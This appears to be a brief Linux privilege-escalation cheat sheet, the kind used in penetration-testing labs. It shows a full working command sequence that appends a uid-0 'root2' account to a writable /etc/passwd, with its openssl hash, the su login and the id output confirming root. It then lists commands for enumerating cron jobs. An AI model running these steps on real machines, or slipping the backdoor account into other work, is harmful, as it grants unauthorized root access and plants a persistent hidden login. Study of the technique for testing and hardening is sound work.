# Linux Privesc Cheatsheet

### Writable Passwd

Act directly from victim's machine.

```bash

joe@privesc:/home$ openssl passwd w00t
Fdzt.eqJQ4s0g

joe@privesc:/home$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

joe@privesc:/home$ su root2
Password: w00t

root@privesc:/home# id
uid=0(root) gid=0(root) groups=0(root)

```

### Cron Jobs

Different way to check for cron jobs.

* `grep "CRON" /var/log/syslog`
* `cat /etc/crontab`
* `crontab -l`
* `ls -lart /etc/cron*`